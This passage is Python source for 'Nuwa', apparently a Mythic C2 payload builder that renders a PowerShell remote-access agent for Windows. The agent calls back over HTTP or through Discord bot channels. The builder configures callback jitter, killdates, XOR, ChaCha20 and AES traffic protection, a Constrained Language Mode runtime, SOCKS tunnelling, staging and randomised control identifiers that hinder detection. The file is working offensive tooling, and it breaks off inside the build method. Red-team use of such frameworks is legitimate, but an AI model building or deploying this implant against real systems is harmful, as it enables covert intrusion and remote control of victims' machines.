        "[byte[]](Unprotect-NuwaBytes -Bytes $decodedBytes -Context $Context)"
        if protected
        else "$decodedBytes"
    )
    return f"""
function ConvertTo-NuwaInner {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$Bytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    return {encoder} -Bytes $Bytes -Context $Context
}}

function ConvertFrom-NuwaInner {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$Bytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    return {decoder} -Bytes $Bytes -Context $Context
}}

function ConvertTo-NuwaWireBytes {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$MessageJson, [Parameter(Mandatory = $true)][hashtable]$Context)
    return ConvertTo-NuwaInner -Bytes ({encode_input}) -Context $Context
}}

function ConvertFrom-NuwaWireBytes {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$WireBytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    $decodedBytes = [byte[]](ConvertFrom-NuwaInner -Bytes $WireBytes -Context $Context)
    $messageBytes = {decode_input}
    $json = ConvertFrom-NuwaUtf8Bytes -Bytes $messageBytes
    $parsed = $json | ConvertFrom-Json -ErrorAction Stop
    if ($null -eq $parsed -or -not $json.Trim().StartsWith('{{')) {{ throw 'Nuwa wire message must be a JSON object' }}
    return [string]$json
}}
""".strip() + "\n"


def _codec_source_path(codec_profile: str, powershell_runtime: str) -> pathlib.Path:
    runtime = _coerce_powershell_runtime(powershell_runtime)
    if codec_profile == "binary-v2":
        return BASE_CODE_ROOT / "binary_v2.ps1"
    if codec_profile == "binary-v1":
        return BASE_CODE_ROOT / (
            "binary_v1_clm.ps1" if runtime == POWERSHELL_RUNTIME_CONSTRAINED
            else "binary_v1.ps1"
        )
    if codec_profile == "base64" and runtime == POWERSHELL_RUNTIME_CONSTRAINED:
        return CLM_CODEC_ROOT / "base64.ps1"
    return CODEC_ROOT / f"{codec_profile}.ps1"


def _base_config(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    framing_mode: str,
) -> dict[str, Any]:
    config = {
        "PayloadUUID": payload_uuid,
        "C2Profile": c2_profile_name,
        "CallbackInterval": int(c2_parameters.get("callback_interval", 3)),
        "CallbackJitter": int(c2_parameters.get("callback_jitter", 30)),
        "ProxyHost": str(c2_parameters.get("proxy_host", "")),
        "ProxyPort": str(c2_parameters.get("proxy_port", "")),
        "Killdate": str(c2_parameters.get("killdate", "")),
        "CodecProfile": codec_profile,
        "MessageUuidLength": 36,
    }
    if framing_mode == "legacy":
        config["ProxyUser"] = str(c2_parameters.get("proxy_user", ""))
        config["ProxyPass"] = str(c2_parameters.get("proxy_pass", ""))
    return config


def _profile_config(c2_profile_name: str, c2_parameters: dict[str, Any]) -> dict[str, Any]:
    if c2_profile_name == "http":
        return {
            "CallbackHost": str(c2_parameters.get("callback_host", "")),
            "CallbackPort": str(c2_parameters.get("callback_port", "80")),
            "PostUri": str(c2_parameters.get("post_uri", "")),
            "Headers": dict(c2_parameters.get("headers", {})),
        }
    if c2_profile_name == "discordx":
        return {
            "DiscordToken": str(c2_parameters.get("discord_token", "")),
            "BotChannel": str(c2_parameters.get("bot_channel", "")),
            "DiscordApiOrigin": str(
                c2_parameters.get("provider_api_origin", "https://discord.com")
            ).rstrip("/"),
            "DiscordGatewayOrigin": str(
                c2_parameters.get("provider_gateway_origin", "")
            ).rstrip("/"),
            "DiscordCdnOrigin": str(
                c2_parameters.get("provider_cdn_origin", "https://cdn.discordapp.com")
            ).rstrip("/"),
            "DiscordApiVersion": int(c2_parameters.get("discord_api_version", 10)),
            "DiscordUserAgent": str(c2_parameters.get("user_agent", DEFAULT_DISCORD_USER_AGENT)),
            "DiscordProviderKind": str(
                c2_parameters.get("discord_provider_kind", "discord")
            ),
            "DiscordListenerId": str(c2_parameters.get("listener_id", "")),
            "MessageChecks": int(c2_parameters.get("message_checks", 10)),
            "TimeBetweenChecks": int(c2_parameters.get("time_between_checks", 10)),
        }
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _transport_envelope_source_paths(
    selection: TransportEnvelopeSelection,
    powershell_runtime: str,
    c2_profile_name: str,
    framing_mode: str,
    codec_profile: str = "binary-v1",
) -> tuple[pathlib.Path, ...]:
    if not selection.enabled:
        return ()
    runtime = _coerce_powershell_runtime(powershell_runtime)
    paths: list[pathlib.Path] = [
        TRANSPORT_ENVELOPE_ROOT / "discord_functions.ps1"
    ]
    format_name = selection.envelope_format
    if codec_profile == "binary-v2" and format_name == "binary-v1":
        format_name += "_v2"
    paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{format_name}.ps1")
    framing_name = f"{framing_mode}_v2" if codec_profile == "binary-v2" else framing_mode
    paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_name}.ps1")

    if selection.protection != "none":
        if selection.key_mode == "directional":
            if runtime == POWERSHELL_RUNTIME_CONSTRAINED:
                paths.extend(
                    [
                        CLM_PROTECTION_ROOT / "common.ps1",
                        CLM_PROTECTION_ROOT / "sha256.ps1",
                        TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "directional_clm.ps1",
                    ]
                )
            else:
                paths.append(TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "directional_full.ps1")
        else:
            paths.append(TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "single.ps1")

    protection_file = {
        "none": "none.ps1",
        "xor-obfuscation-v1": "xor.ps1",
        "chacha20-v1": "chacha20.ps1",
        "aes256-hmac-v1": (
            "aes_clm.ps1"
            if runtime == POWERSHELL_RUNTIME_CONSTRAINED
            else "aes_full.ps1"
        ),
    }[selection.protection]
    if (
        selection.protection == "aes256-hmac-v1"
        and runtime == POWERSHELL_RUNTIME_CONSTRAINED
    ):
        for helper in (
            CLM_PROTECTION_ROOT / "common.ps1",
            CLM_PROTECTION_ROOT / "sha256.ps1",
            CLM_PROTECTION_ROOT / "aes256.ps1",
        ):
            if helper not in paths:
                paths.append(helper)
    presentation_path = TRANSPORT_ENVELOPE_PRESENTATION_ROOT / f"{selection.presentation}.ps1"
    if (
        selection.presentation == "base64"
        and runtime == POWERSHELL_RUNTIME_CONSTRAINED
    ):
        presentation_path = (
            TRANSPORT_ENVELOPE_PRESENTATION_ROOT / "clm" / "base64.ps1"
        )
    paths.extend(
        [
            TRANSPORT_ENVELOPE_PROTECTION_ROOT / protection_file,
            presentation_path,
        ]
    )
    for path in paths:
        if not path.is_file():
            raise ValueError(f"Missing transport-envelope source '{path.name}'")
    return tuple(paths)


def _apply_transport_envelope_config(
    config: dict[str, Any],
    selection: TransportEnvelopeSelection,
) -> None:
    if not selection.enabled:
        return
    config["TransportEnvelopeEnabled"] = True
    config["TransportEnvelopeFormat"] = selection.envelope_format
    config["TransportPresentation"] = selection.presentation
    config["TransportProtection"] = selection.protection
    config["TransportKeyMode"] = selection.key_mode
    if selection.nonce_strategy is not None:
        config["TransportNonceStrategy"] = selection.nonce_strategy


def _render_transport_envelope_state(selection: TransportEnvelopeSelection) -> str:
    if selection.key is None:
        return '@{ "MasterKey" = $null }'
    return "@{ \"MasterKey\" = " + _ps_byte_array(selection.key) + " }"


def _render_numeric_transport_envelope_state(selection: TransportEnvelopeSelection, profile: ResolvedControlProfile | None = None) -> str:
    key = "$null" if selection.key is None else _ps_byte_array(selection.key)
    return (
        "$script:NuwaTransportEnvelopeState = " + _ps_empty_local_slots(profile) + "\n"
        f"$script:NuwaTransportEnvelopeState[$script:NuwaL_MasterKey] = {key}"
    )


def _profile_framing_source_path(
    c2_profile_name: str,
    framing_mode: str,
    selection: TransportEnvelopeSelection,
) -> pathlib.Path:
    if c2_profile_name == "http" and selection.enabled:
        return TRANSPORT_ENVELOPE_CARRIER_ROOT / f"http_{framing_mode}.ps1"
    return PROFILE_ROOT / c2_profile_name / "framing" / framing_mode / "functions.ps1"


def _render_profile_transport_source(
    c2_profile_name: str,
    selection: TransportEnvelopeSelection,
    codec_profile: str = "binary-v1",
) -> str:
    transport_name = "transport_v2.ps1" if c2_profile_name == "discordx" and codec_profile == "binary-v2" else "transport.ps1"
    source = _read_text(PROFILE_ROOT / c2_profile_name / transport_name)
    fixed_regions = {
        "discordx": (
            (
                "# NUWA_DISCORD_FIXED_ENCODE_BEGIN\n",
                "# NUWA_DISCORD_FIXED_ENCODE_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "discord_encode.ps1",
                "fixed Discord encoder",
            ),
            (
                "# NUWA_DISCORD_FIXED_DECODE_BEGIN\n",
                "# NUWA_DISCORD_FIXED_DECODE_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "discord_decode.ps1",
                "fixed Discord decoder",
            ),
        ),
        "http": (
            (
                "# NUWA_HTTP_FIXED_TRANSPORT_BEGIN\n",
                "# NUWA_HTTP_FIXED_TRANSPORT_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "http_transport.ps1",
                "fixed HTTP transport",
            ),
        ),
    }[c2_profile_name]
    if selection.enabled:
        for fixed_begin, fixed_end, replacement_path, label in fixed_regions:
            source = _replace_marked_source_region(
                source,
                begin_marker=fixed_begin,
                end_marker=fixed_end,
                replacement=_read_text(replacement_path),
                label=label,
            )
    else:
        for fixed_begin, fixed_end, _, _ in fixed_regions:
            source = source.replace(fixed_begin, "").replace(fixed_end, "")
    begin_marker = "    # NUWA_TRANSPORT_ENVELOPE_BEGIN\n"
    end_marker = "    # NUWA_TRANSPORT_ENVELOPE_END\n"
    if not selection.enabled:
        while begin_marker in source:
            start = source.index(begin_marker)
            end = source.index(end_marker, start) + len(end_marker)
            source = source[:start] + source[end:]
        if c2_profile_name == "http":
            source = _replace_source_once(
                source,
                "    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody\n}",
                "    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody\n"
                "    return Invoke-NuwaHttpRequest -Body $body\n}",
                label="legacy HTTP transport return",
            )
    else:
        source = source.replace(begin_marker, "").replace(end_marker, "")
    if c2_profile_name == "discordx" and selection.enabled:
        source = _replace_source_once(
            source,
            'filename="status-server"',
            'filename="message.txt"',
            label="Discord attachment filename",
        )
    return source


def render_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
    control_profile: ResolvedControlProfile | None = None,
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    v3 = control_profile is not None and control_profile.kind == "binary-v3"
    if v3 and (codec_profile != "binary-v2" or control_profile.payload_uuid != payload_uuid):
        raise ValueError("Nuwa v3 control identifiers require binary-v2 runtime and matching payload UUID")
    powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
    socks_selected = _validate_socks_build(
        c2_profile_name=c2_profile_name, c2_parameters=c2_parameters,
        powershell_runtime=powershell_runtime, command_names=command_names,
    )
    transport_envelope = _resolve_transport_envelope_selection(
        c2_profile_name,
        c2_parameters,
    )
    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)
    _validate_payload_compatibility(
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        framing_mode=framing_mode,
        codec_profile=codec_profile,
        protection_profile=PROTECTION_NONE,
        exchange_enabled=False,
        transport_envelope=transport_envelope,
    )

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        framing_mode=framing_mode,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))
    if codec_profile == "binary-v2":
        config["C2Profile"] = _control_ids(control_profile, "profiles", PROFILE_CODES)[c2_profile_name]
    if socks_selected:
        config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
    config["PowerShellRuntime"] = (
        _control_ids(control_profile, "runtime_modes", RUNTIME_MODE_CODES)[powershell_runtime]
        if codec_profile == "binary-v2" else powershell_runtime
    )
    _apply_transport_envelope_config(config, transport_envelope)
    if codec_profile == "binary-v2":
        for name in UNUSED_V2_CONFIG_SETTINGS:
            config.pop(name, None)
    if transport_envelope.enabled:
        if codec_profile == "binary-v2":
            config["TransportMessageFormat"] = _control_ids(control_profile, "framing_modes", FRAMING_MODE_CODES)[framing_mode]
        else:
            config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""

    local_init = (
        _render_numeric_local_initialization(config, control_profile) if codec_profile == "binary-v2"
        else [
            "$script:NuwaConfig = " + _ps_hashtable(config),
            "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        ]
    )
    sections = [*local_init, _read_text(BASE_CODE_ROOT / "utf8.ps1")]
    if codec_profile == "binary-v2":
        sections.extend((
            _render_v3_schema(control_profile) if v3 else _read_text(BASE_CODE_ROOT / "agent_message_schema_v2.ps1"),
            _read_text(BASE_CODE_ROOT / ("agent_message_v3.ps1" if v3 else "agent_message_v2.ps1")),
        ))
    if transport_envelope.enabled:
        sections.insert(
            len(local_init),
            (_render_numeric_transport_envelope_state(transport_envelope, control_profile)
             if codec_profile == "binary-v2" else
             "$script:NuwaTransportEnvelopeState = " + _render_transport_envelope_state(transport_envelope)),
        )
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / ("functions_v2.ps1" if codec_profile == "binary-v2" else "functions.ps1")),
            _read_text(
                _profile_framing_source_path(
                    c2_profile_name,
                    framing_mode,
                    transport_envelope,
                )
            ),
            _read_text(BASE_CODE_ROOT / ("runtime_helpers_v2.ps1" if codec_profile == "binary-v2" else "runtime_helpers.ps1")),
            _render_static_codec_dispatch_source(codec_profile),
        ]
    )
    for decoder_profile in _decode_codec_profiles(codec_profile):
        codec_path = _codec_source_path(decoder_profile, powershell_runtime)
        sections.append(
            _render_numeric_codec_module(codec_path, control_profile) if decoder_profile == "binary-v2"
            else _read_text(codec_path)
        )
    if v3:
        sections.append(_read_text(BASE_CODE_ROOT / "binary_v3.ps1"))
    if transport_envelope.enabled:
        sections.extend(
            _read_text(path)
            for path in _transport_envelope_source_paths(
                transport_envelope,
                powershell_runtime,
                c2_profile_name,
                framing_mode,
                codec_profile,
            )
        )
    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope, codec_profile))

    if socks_selected:
        if codec_profile == "binary-v2":
            sections.append(_render_numeric_socks_slot_ids(control_profile))
            sections.extend(_render_numeric_socks_module(path, control_profile) for path in _socks_source_paths(codec_profile))
        else:
            sections.extend(_read_text(path) for path in _socks_source_paths(codec_profile))

    selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
    for dependency in ("hostname", "whoami"):
        if dependency not in selected_commands:
            selected_commands.insert(0, dependency)
    for command_name in selected_commands:
        versioned_path = COMMAND_ROOT / f"{command_name}_v2.ps1"
        command_path = versioned_path if codec_profile == "binary-v2" and versioned_path.exists() else COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    agent_main_source = _read_text(BASE_CODE_ROOT / ("agent_main_v2.ps1" if codec_profile == "binary-v2" else "agent_main.ps1"))
    agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected, codec_profile=codec_profile)
    if c2_profile_name == "discordx" and transport_envelope.enabled:
        agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
    sections.append(agent_main_source)
    rendered_source = _render_debug_mode(
        "\n\n".join(sections) + "\n", enabled=debug_logging, codec_profile=codec_profile
    )
    if codec_profile == "binary-v2":
        rendered_source = _replace_numeric_local_accesses(rendered_source, control_profile)
        rendered_source = _replace_v2_private_response_records(rendered_source, control_profile)
        rendered_source = _remove_v2_test_entropy_hook(rendered_source)
        rendered_source = _replace_v2_fixed_diagnostics(
            rendered_source, debug_logging=debug_logging, allow_v3=v3,
            control_profile=control_profile if v3 else None,
        )
        if v3:
            rendered_source = _adapt_v3_runtime_source(rendered_source)
    base64_selected = (
        codec_profile == "base64" or transport_envelope.presentation == "base64"
    )
    if framing_mode == "raw" and not base64_selected:
        _validate_raw_artifact(rendered_source.encode("utf-8"))
    return rendered_source


def render_protected_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    protection_profile: str,
    protection_key: bytes,
    powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
    staging_enabled: bool = False,
    control_profile: ResolvedControlProfile | None = None,
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    v3 = control_profile is not None and control_profile.kind == "binary-v3"
    if v3 and (codec_profile != "binary-v2" or control_profile.payload_uuid != payload_uuid):
        raise ValueError("Nuwa v3 control identifiers require binary-v2 runtime and matching payload UUID")
    transport_envelope = _resolve_transport_envelope_selection(
        c2_profile_name,
        c2_parameters,
    )
    protection_profile = str(protection_profile or "").strip().lower()
    if protection_profile not in PROTECTED_PROFILES:
        raise ValueError(f"Unsupported protected profile '{protection_profile}'")
    powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
    socks_selected = _validate_socks_build(
        c2_profile_name=c2_profile_name, c2_parameters=c2_parameters,
        powershell_runtime=powershell_runtime, command_names=command_names,
    )
    if not isinstance(protection_key, bytes) or len(protection_key) != 32:
        raise ValueError("Protected payload rendering requires one 32-byte key")
    if not isinstance(staging_enabled, bool):
        raise ValueError("staging_enabled must be Boolean")
    protection_source_paths = _protection_source_paths(
        protection_profile,
        powershell_runtime,
    )

    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)
    _validate_payload_compatibility(
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        framing_mode=framing_mode,
        codec_profile=codec_profile,
        protection_profile=protection_profile,
        exchange_enabled=staging_enabled,
        transport_envelope=transport_envelope,
    )

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        framing_mode=framing_mode,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))
    if codec_profile == "binary-v2":
        config["C2Profile"] = _control_ids(control_profile, "profiles", PROFILE_CODES)[c2_profile_name]
    if socks_selected:
        config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
    config["PowerShellRuntime"] = (
        _control_ids(control_profile, "runtime_modes", RUNTIME_MODE_CODES)[powershell_runtime]
        if codec_profile == "binary-v2" else powershell_runtime
    )
    _apply_transport_envelope_config(config, transport_envelope)
    if codec_profile == "binary-v2":
        for name in UNUSED_V2_CONFIG_SETTINGS:
            config.pop(name, None)
    if transport_envelope.enabled:
        if codec_profile == "binary-v2":
            config["TransportMessageFormat"] = _control_ids(control_profile, "framing_modes", FRAMING_MODE_CODES)[framing_mode]
        else:
            config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
    config["ProtectionProfile"] = protection_profile
    crypto_state = "\n".join(
        [
            "@{",
            f'    "OuterUuid" = {_ps_literal(payload_uuid)}',
            f'    "Key" = {_ps_byte_array(protection_key)}',
            "}",
        ]
    )
    crypto_source = (
        "\n".join((
        "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(control_profile),
            f"$script:NuwaCryptoState[$script:NuwaK_OuterUuid] = {_ps_literal(payload_uuid)}",
            f"$script:NuwaCryptoState[$script:NuwaK_Key] = {_ps_byte_array(protection_key)}",
        ))
        if codec_profile == "binary-v2" else "$script:NuwaCryptoState = " + crypto_state
    )

    local_init = (
        _render_numeric_local_initialization(config, control_profile) if codec_profile == "binary-v2"
        else [
            "$script:NuwaConfig = " + _ps_hashtable(config),
            "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        ]
    )
    sections = [*local_init, crypto_source,
                _read_text(BASE_CODE_ROOT / "utf8.ps1")]
    if codec_profile == "binary-v2":
        sections.extend((
            _render_v3_schema(control_profile) if v3 else _read_text(BASE_CODE_ROOT / "agent_message_schema_v2.ps1"),
            _read_text(BASE_CODE_ROOT / ("agent_message_v3.ps1" if v3 else "agent_message_v2.ps1")),
        ))
    if transport_envelope.enabled:
        sections.insert(
            len(local_init) + 1,
            (_render_numeric_transport_envelope_state(transport_envelope, control_profile)
             if codec_profile == "binary-v2" else
             "$script:NuwaTransportEnvelopeState = " + _render_transport_envelope_state(transport_envelope)),
        )
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / ("functions_v2.ps1" if codec_profile == "binary-v2" else "functions.ps1")),
            _read_text(
                _profile_framing_source_path(
                    c2_profile_name,
                    framing_mode,
                    transport_envelope,
                )
            ),
            _read_text(BASE_CODE_ROOT / ("runtime_helpers_v2.ps1" if codec_profile == "binary-v2" else "runtime_helpers.ps1")),
            *(
                _render_numeric_protection_module(path) if codec_profile == "binary-v2"
                else _read_text(path)
                for path in protection_source_paths
            ),
            _render_static_codec_dispatch_source(codec_profile, protected=True),
        ]
    )
    for decoder_profile in _decode_codec_profiles(codec_profile):
        codec_path = _codec_source_path(decoder_profile, powershell_runtime)
        sections.append(
            _render_numeric_codec_module(codec_path, control_profile) if decoder_profile == "binary-v2"
            else _read_text(codec_path)
        )
    if v3:
        sections.append(_read_text(BASE_CODE_ROOT / "binary_v3.ps1"))
    if transport_envelope.enabled:
        sections.extend(
            _read_text(path)
            for path in _transport_envelope_source_paths(
                transport_envelope,
                powershell_runtime,
                c2_profile_name,
                framing_mode,
                codec_profile,
            )
            if path not in protection_source_paths
        )
    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope, codec_profile))

    if socks_selected:
        if codec_profile == "binary-v2":
            sections.append(_render_numeric_socks_slot_ids(control_profile))
            sections.extend(_render_numeric_socks_module(path, control_profile) for path in _socks_source_paths(codec_profile))
        else:
            sections.extend(_read_text(path) for path in _socks_source_paths(codec_profile))

    selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
    for dependency in ("hostname", "whoami"):
        if dependency not in selected_commands:
            selected_commands.insert(0, dependency)
    for command_name in selected_commands:
        versioned_path = COMMAND_ROOT / f"{command_name}_v2.ps1"
        command_path = versioned_path if codec_profile == "binary-v2" and versioned_path.exists() else COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    staging_module = ""
    if staging_enabled:
        staging_module = _read_text(_staging_source_path(powershell_runtime, codec_profile))
        staged_runtime = _render_staged_agent_runtime_source(codec_profile)
        staged_runtime = _render_socks_agent_main_source(staged_runtime, selected=socks_selected, codec_profile=codec_profile)
        staged_main = _read_text(STAGING_ROOT / "agent_main.ps1")
        if c2_profile_name == "discordx" and transport_envelope.enabled:
            staged_runtime = _render_discord_byte_agent_main_source(staged_runtime)
        sections.extend(
            [
                staging_module,
                staged_runtime,
                staged_main,
            ]
        )
    else:
        agent_main_source = _render_protected_agent_main_source(codec_profile)
        agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected, codec_profile=codec_profile)
        if c2_profile_name == "discordx" and transport_envelope.enabled:
            agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
        sections.append(agent_main_source)
    rendered_source = _render_debug_mode(
        "\n\n".join(sections) + "\n", enabled=debug_logging, codec_profile=codec_profile
    )
    if codec_profile == "binary-v2":
        rendered_source = _replace_numeric_local_accesses(rendered_source, control_profile)
        rendered_source = _replace_v2_private_response_records(rendered_source, control_profile)
        rendered_source = _remove_v2_test_entropy_hook(rendered_source)
        rendered_source = _replace_v2_fixed_diagnostics(
            rendered_source, debug_logging=debug_logging, allow_v3=v3,
            control_profile=control_profile if v3 else None,
        )
        if v3:
            rendered_source = _adapt_v3_runtime_source(rendered_source)
    base64_selected = (
        codec_profile == "base64" or transport_envelope.presentation == "base64"
    )
    if framing_mode == "raw":
        rendered_bytes = rendered_source.encode("utf-8")
        if staging_enabled:
            checked_staging_module = (
                _replace_v2_fixed_diagnostics(
                    _replace_v2_private_response_records(_replace_numeric_local_accesses(staging_module, control_profile), control_profile),
                    debug_logging=debug_logging,
                    allow_v3=v3,
                    control_profile=control_profile if v3 else None,
                )
                if codec_profile == "binary-v2" else staging_module
            )
            _validate_staged_raw_artifact(
                rendered_bytes,
                (
                    checked_staging_module if debug_logging
                    else _strip_debug_calls(checked_staging_module)
                ).encode("utf-8"),
                allow_base64_tokens=base64_selected,
            )
        elif not base64_selected:
            _validate_raw_artifact(rendered_bytes)
    return rendered_source


class Nuwa(PayloadType):
    name = "nuwa"
    file_extension = "ps1"
    author = "@openai"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads: list[str] = []
    # Mythic honors the operator's build-time command selection only when this
    # flag is true. Nuwa still bundles selected scripts statically and offers
    # no runtime load command.
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = "nuwa_translation"
    c2_profiles = ["http", "discordx"]
    message_uuid_length = 36
    note = "Windows PowerShell 5.1 agent using a translation container for custom wire encoding."
    agent_path = pathlib.Path(".") / "nuwa" / "mythic"
    agent_code_path = pathlib.Path(".") / "nuwa" / "agent_code"
    agent_icon_path = agent_path / "nuwa.svg"
    build_steps = [
        BuildStep(step_name="Render", step_description="Rendering PowerShell payload"),
    ]
    c2_parameter_deviations = {
        "http": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                default_value=False,
            ),
        },
        "discordx": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                choices=["T", "F"],
                default_value="F",
            ),
        },
    }
    build_parameters = [
        BuildParameter(
            name="control_id_mode",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["default", "custom", "random"],
            default_value="default",
            description="Keep legacy IDs, use an uploaded v3 JSON map, or derive a v3 map from this payload UUID",
        ),
        BuildParameter(
            name="control_id_random_style",
            parameter_type=BuildParameterType.String,
            default_value="compact",
            description="Internal mapping marker for historical random payload compatibility",
            hide_conditions=[
                HideCondition(name="control_id_mode", operand=HideConditionOperand.IN,
                              choices=["default", "custom", "random"]),
            ],
        ),
        BuildParameter(
            name="control_id_file",
            parameter_type=BuildParameterType.File,
            required=False,
            description="Uploaded v3 control identifier JSON file; required only for custom mode",
        ),
        BuildParameter(
            name="codec_profile",
            parameter_type=BuildParameterType.ChooseOne,
            choices=list(POWERSHELL_CODEC_PROFILES),
            default_value="binary-v2",
            description=(
                "Nuwa inner v2 is a canonical numeric-keyed binary map with raw file and SOCKS bytes. "
                "The fixed outer envelope and its presentation are selected separately "
                "on the C2 profile."
            ),
        ),
        BuildParameter(
            name="debug_logging",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Include debug code at build time; omit it from release payloads",
        ),
        BuildParameter(
            name="require_https",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Reject HTTP callback URLs that do not use HTTPS",
        ),
        BuildParameter(
            name="powershell_runtime",
            parameter_type=BuildParameterType.ChooseOne,
            choices=list(POWERSHELL_RUNTIME_CHOICES),
            default_value=POWERSHELL_RUNTIME_FULL,
            description="Select optimized Full Language or CLM-compatible PowerShell runtime source",
        ),
    ]

    async def build(self) -> BuildResponse:
        response = BuildResponse(status=BuildStatus.Success)
        try:
            control_mode = str(self.get_parameter("control_id_mode") or "default").strip().lower()
            random_style = self.get_parameter("control_id_random_style")
            if control_mode == "random" and random_style != "compact":
                raise ValueError("control_id_random_style is fixed to compact for new random payloads")
            control_file_id = self.get_parameter("control_id_file")
            control_file_bytes = None
            if control_mode == "custom":
                if not isinstance(control_file_id, str) or not control_file_id:
                    raise ValueError("control_id_file is required in custom mode")
                from mythic_container.MythicGoRPC import (
                    MythicRPCFileGetContentMessage, SendMythicRPCFileGetContent,
                )
                file_response = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=control_file_id)
                )
                if not file_response.Success or not isinstance(file_response.Content, bytes):
                    raise ValueError("control_id_file could not be retrieved from Mythic")
                control_file_bytes = file_response.Content
            elif control_file_id:
                raise ValueError("control_id_file is only valid in custom mode")
            control_profile = (
                resolve_control_profile(load_default_profile(), control_mode, self.uuid,
                                        control_file_bytes, random_style=random_style)
                if control_mode != "default" else None
            )
            selected_c2 = _resolve_selected_c2_profile(self.c2info)
            options = _resolve_payload_options(
                c2_profile_name=selected_c2.name,
                c2_parameters=selected_c2.parameters,
                codec_profile=self.get_parameter("codec_profile"),
                debug_logging=self.get_parameter("debug_logging"),
                require_https=self.get_parameter("require_https"),
                powershell_runtime=self.get_parameter("powershell_runtime"),
                command_names=list(self.commands.get_commands()),
            )
            protection = options.protection
            powershell_runtime = options.powershell_runtime
